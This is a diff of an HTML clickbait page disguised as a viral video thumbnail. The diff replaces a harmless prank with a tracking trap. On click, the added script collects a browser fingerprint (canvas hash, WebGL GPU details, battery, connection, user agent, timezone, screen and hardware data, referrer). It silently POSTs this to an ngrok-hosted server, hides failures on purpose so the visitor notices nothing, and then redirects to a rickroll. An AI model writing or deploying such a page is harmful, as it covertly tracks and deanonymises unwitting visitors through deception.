@@ -3,246 +3,202 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>YOU WON'T BELIEVE THIS...</title>
-  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@300;400;600&display=swap" rel="stylesheet"/>
+  <title>You Won't Believe What Happens Next...</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     :root {
-      --bg: #0a0a0a; --surface: #111; --border: #222;
-      --accent: #ff3c3c; --accent2: #ffcc00; --text: #eee;
-      --glow: rgba(255,60,60,0.35);
+      --bg: #0a0a0a; --accent: #ff2d55; --text: #eee;
     }
     body {
       background: var(--bg); color: var(--text);
       font-family: 'Space Grotesk', sans-serif;
-      min-height: 100vh; display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
       overflow: hidden; position: relative;
     }
-    body::before {
-      content: ''; position: fixed; inset: 0;
-      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
-      opacity: 0.35; pointer-events: none;
-    }
-    .container { position: relative; z-index: 1; display: flex; flex-direction: column; align-items: center; gap: 32px; text-align: center; }
-
+    .container { text-align: center; z-index: 1; }
     .title {
-      font-family: 'Bebas Neue', sans-serif; 
-      font-size: clamp(2.8rem, 8vw, 5.5rem); 
-      letter-spacing: .08em; 
+      font-family: 'Bebas Neue', sans-serif;
+      font-size: clamp(2.8rem, 8vw, 5.5rem);
+      letter-spacing: 0.05em;
       line-height: 1.05;
-      text-shadow: 0 0 30px rgba(255,60,60,0.4);
+      margin-bottom: 20px;
     }
-    .title span { color: var(--accent2); }
-
     .subtitle {
       font-size: 1.35rem;
-      color: #aaa;
+      opacity: 0.85;
+      margin-bottom: 40px;
       max-width: 620px;
-      line-height: 1.4;
     }
-
-    .trap-wrapper { position: relative; }
-    
-    .trap-img {
-      width: clamp(280px, 52vw, 520px);
+    .video-box {
+      width: clamp(280px, 65vw, 520px);
       aspect-ratio: 16/9;
-      border-radius: 12px;
-      border: 3px solid #222;
-      cursor: pointer;
+      background: linear-gradient(135deg, #1a1a2e, #16213e, #0f1b3a);
+      border-radius: 16px;
+      border: 3px solid #333;
       overflow: hidden;
-      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%);
-      transition: all 0.25s ease;
+      cursor: pointer;
       position: relative;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
     }
-    
-    .trap-img:hover {
+    .video-box:hover {
       transform: scale(1.04);
       border-color: var(--accent);
-      box-shadow: 0 0 50px var(--glow);
+      box-shadow: 0 20px 60px rgba(255,45,85,0.3);
     }
-
-    .fake-thumb {
-      width: 100%; height: 100%;
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-end;
-      padding: 28px;
-      position: relative;
-    }
-
-    .fake-thumb::before {
-      content: '▶';
-      position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 4.5rem;
-      color: rgba(255,255,255,0.9);
-      text-shadow: 0 0 40px rgba(255,255,255,0.6);
-      transition: transform 0.3s ease;
-    }
-
-    .trap-img:hover .fake-thumb::before {
-      transform: translate(-50%, -50%) scale(1.2);
-    }
-
-    .fake-thumb-label {
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: 1.45rem;
-      letter-spacing: .06em;
-      line-height: 1.15;
-      text-shadow: 0 4px 12px rgba(0,0,0,0.9);
-    }
-
-    .fake-thumb-sub {
-      margin-top: 8px;
-      font-family: 'DM Mono', monospace;
-      font-size: 0.78rem;
-      color: rgba(255,255,255,0.6);
-    }
-
-    .badge {
-      position: absolute;
-      top: -14px; right: -14px;
-      background: #ff3c3c;
-      color: white;
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: 1rem;
-      letter-spacing: .12em;
-      padding: 6px 16px;
-      border-radius: 6px;
-      box-shadow: 0 0 20px rgba(255,60,60,0.6);
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.08); }
-    }
-
-    .overlay {
+    .play-overlay {
       position: absolute;
       inset: 0;
-      background: rgba(0,0,0,0.85);
-      display: none;
+      display: flex;
       align-items: center;
       justify-content: center;
-      flex-direction: column;
-      color: white;
-      font-family: 'DM Mono', monospace;
-      z-index: 10;
+      background: rgba(0,0,0,0.4);
+      transition: all 0.3s ease;
     }
-
-    .overlay.show { display: flex; }
-
-    .loading {
-      width: 48px;
-      height: 48px;
-      border: 4px solid #333;
-      border-top: 4px solid #ffcc00;
+    .video-box:hover .play-overlay {
+      background: rgba(0,0,0,0.25);
+    }
+    .play-button {
+      width: 80px;
+      height: 80px;
+      background: rgba(255,255,255,0.95);
       border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.2rem;
+      color: #000;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+      transition: transform 0.2s ease;
     }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .toast {
-      position: fixed; bottom: 40px; left: 50%;
-      transform: translateX(-50%);
-      background: #111;
-      border: 2px solid #333;
-      border-radius: 9999px;
-      padding: 14px 32px;
-      font-family: 'DM Mono', monospace;
+    .video-box:hover .play-button {
+      transform: scale(1.15);
+    }
+    .label {
+      position: absolute;
+      bottom: 20px;
+      left: 20px;
+      font-family: 'Bebas Neue', sans-serif;
+      font-size: 1.4rem;
+      letter-spacing: 0.03em;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+    }
+    .fake-duration {
+      position: absolute;
+      bottom: 18px;
+      right: 20px;
       font-size: 0.85rem;
-      color: #ccc;
-      white-space: nowrap;
-      opacity: 0;
-      transition: all 0.4s cubic-bezier(0.34,1.56,0.64,1);
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      background: rgba(0,0,0,0.7);
+      padding: 3px 10px;
+      border-radius: 4px;
+      font-family: monospace;
     }
-
-    .toast.show {
-      opacity: 1;
-      transform: translateX(-50%) translateY(-10px);
-    }
-
-    .corner {
-      position: fixed; width: 70px; height: 70px;
-      border-color: #1e1e1e; border-style: solid; opacity: 0.5;
-    }
-    .corner.tl{top:24px;left:24px;border-width:2px 0 0 2px}
-    .corner.tr{top:24px;right:24px;border-width:2px 2px 0 0}
-    .corner.bl{bottom:24px;left:24px;border-width:0 0 2px 2px}
-    .corner.br{bottom:24px;right:24px;border-width:0 2px 2px 0}
   </style>
 </head>
 <body>
-  <div class="corner tl"></div>
-  <div class="corner tr"></div>
-  <div class="corner bl"></div>
-  <div class="corner br"></div>
-
   <div class="container">
-    <div class="title">YOU WON'T BELIEVE<br>WHAT HAPPENS <span>NEXT</span></div>
-    <div class="subtitle">Click the video if you dare 😈</div>
-
-    <div class="trap-wrapper">
-      <div class="badge">VIRAL</div>
-      <div class="trap-img" id="trap">
-        <div class="fake-thumb">
-          <div class="fake-thumb-label">INSANE MOMENT CAUGHT ON CAMERA</div>
-          <div class="fake-thumb-sub">definitely-not-a-trap.mp4 • 4:20 • 12M views</div>
-        </div>
-
-        <!-- Fake video overlay -->
-        <div class="overlay" id="overlay">
-          <div class="loading"></div>
-          <div style="font-size:1.1rem; margin-bottom:8px;">LOADING VIDEO...</div>
-          <div style="font-size:0.75rem; opacity:0.7;">This is gonna be good</div>
-        </div>
+    <div class="title">YOU WON'T BELIEVE<br>WHAT HAPPENS NEXT</div>
+    <div class="subtitle">Click to watch the craziest video of 2026 👀</div>
+    
+    <div class="video-box" id="trap" onclick="handleClick()">
+      <div class="play-overlay">
+        <div class="play-button">▶</div>
       </div>
+      <div class="label">mind blowing ending...</div>
+      <div class="fake-duration">4:20</div>
     </div>
   </div>
 
-  <div class="toast" id="toast">😂 Nice try</div>
-
   <script>
-    const trap = document.getElementById('trap');
-    const overlay = document.getElementById('overlay');
-    const toast = document.getElementById('toast');
+    const SERVER_URL = "https://unregrettably-coessential-joye.ngrok-free.dev";  // ← your ngrok
 
-    function showToast(msg) {
-      toast.textContent = msg;
-      toast.classList.add('show');
-      setTimeout(() => toast.classList.remove('show'), 2800);
+    function canvasFP() {
+      try {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        ctx.textBaseline = 'top'; 
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60'; 
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = '#069'; 
+        ctx.fillText('lol', 2, 15);
+        return btoa(c.toDataURL().slice(-80));
+      } catch { return 'blocked'; }
     }
 
-    trap.addEventListener('click', () => {
-      overlay.classList.add('show');
-      
-      // Fake "loading" then funny message
-      setTimeout(() => {
-        showToast("😂 Bro really clicked it");
-      }, 1200);
+    function webglInfo() {
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (!gl) return { renderer: 'none', vendor: 'none' };
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'hidden',
+          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'hidden'
+        };
+      } catch { return { renderer: 'error', vendor: 'error' }; }
+    }
 
-      // Auto hide overlay after a while
-      setTimeout(() => {
-        overlay.classList.remove('show');
-      }, 4500);
-    });
+    async function batteryInfo() {
+      try {
+        const b = await navigator.getBattery();
+        return {
+          level: Math.round(b.level * 100) + '%',
+          charging: b.charging
+        };
+      } catch { return { level: 'N/A', charging: false }; }
+    }
 
-    // Easter egg: hold click for extra fun
-    let holdTimer;
-    trap.addEventListener('mousedown', () => {
-      holdTimer = setTimeout(() => {
-        showToast("🫵 You held it too long lol");
+    function connectionInfo() {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!c) return {};
+      return {
+        type: c.effectiveType || c.type || 'unknown',
+        downlink: c.downlink || 'unknown'
+      };
+    }
+
+    async function handleClick() {
+      // Fake "loading" the video for a second
+      const box = document.getElementById('trap');
+      box.style.pointerEvents = 'none';
+      box.innerHTML = `<div style="height:100%;display:flex;align-items:center;justify-content:center;color:#666;font-size:1.1rem;">Loading the craziest video...</div>`;
+
+      const payload = {
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenRes: `${screen.width}x${screen.height}`,
+        cpuCores: navigator.hardwareConcurrency || 'N/A',
+        deviceMemory: navigator.deviceMemory || 'N/A',
+        canvasFP: canvasFP(),
+        webgl: webglInfo(),
+        battery: await batteryInfo(),
+        connection: connectionInfo(),
+        referrer: document.referrer || 'direct',
+        pageUrl: window.location.href
+      };
+
+      try {
+        await fetch(SERVER_URL + '/trap', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'ngrok-skip-browser-warning': 'true'
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        // silent fail - looks more natural
+      }
+
+      // Optional: redirect to a real funny video or rickroll after logging
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq"; // rickroll example
       }, 800);
-    });
-
-    trap.addEventListener('mouseup', () => clearTimeout(holdTimer));
-    trap.addEventListener('mouseleave', () => clearTimeout(holdTimer));
+    }
   </script>
 </body>
 </html>
